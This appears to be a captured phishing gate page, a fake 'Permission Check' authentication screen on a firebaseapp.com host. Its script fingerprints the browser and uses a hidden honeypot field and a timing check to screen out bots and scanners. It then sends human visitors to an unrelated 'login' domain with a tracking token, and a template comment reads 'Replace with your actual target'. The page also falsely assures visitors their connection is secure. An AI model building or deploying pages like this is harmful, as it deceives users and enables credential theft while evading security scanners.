@@ -1,0 +1,125 @@
+<!-- url: https://auroraesi.firebaseapp.com/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Authentication</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: url('https://cdn.wallpapersafari.com/57/79/ZWKHlP.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .auth-container {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 40px 30px;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    .auth-container h2 {
+      font-size: 16px;
+      color: #1a1a1a;
+      margin-bottom: 25px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #0078d4;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005a9e;
+    }
+
+    .footer-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+    }
+
+    /* Honeypot field */
+    .hp-field {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+    }
+  </style>
+</head>
+<body>
+  <div class="auth-container">
+    <h2>Permission Check</h2>
+
+    <form id="authForm">
+      <input type="text" name="email_confirmation" class="hp-field" autocomplete="off" />
+      <input type="hidden" id="fingerprint" name="fingerprint" />
+      <button id="authBtn" type="submit">Authenticate</button>
+    </form>
+
+    <div class="footer-note">Your connection is secure and encrypted.</div>
+  </div>
+
+  <script>
+    const startTime = Date.now();
+
+    // Simple fingerprinting
+    function generateFingerprint() {
+      return btoa(navigator.userAgent + screen.width + screen.height);
+    }
+
+    document.getElementById('fingerprint').value = generateFingerprint();
+
+    document.getElementById("authForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const honeypot = document.querySelector('input[name="email_confirmation"]').value;
+      const elapsed = Date.now() - startTime;
+
+      // Bot detection logic
+      if (honeypot.trim() !== "") {
+        alert("Bot activity detected.");
+        return;
+      }
+
+      if (elapsed < 1500) {
+        alert("Please wait a moment before submitting.");
+        return;
+      }
+
+      const fp = document.getElementById("fingerprint").value;
+      if (!fp || fp.length < 10) {
+        alert("Fingerprint validation failed.");
+        return;
+      }
+
+      // Passed all bot checks
+      window.location.href = "https://login.daycaheating.com/eaTkpQLs?user_id=ptlF3eehzjunERJ0GU1n7KQmHiyjP0iQ7zC2qwaNyFZYUFy1Nc9BxhcdgiFs3vWWRTc2Q83ShULgzji0T7nB3tcA8OwkVCfLuLM"; // Replace with your actual target
+    });
+  </script>
+</body>
+</html>
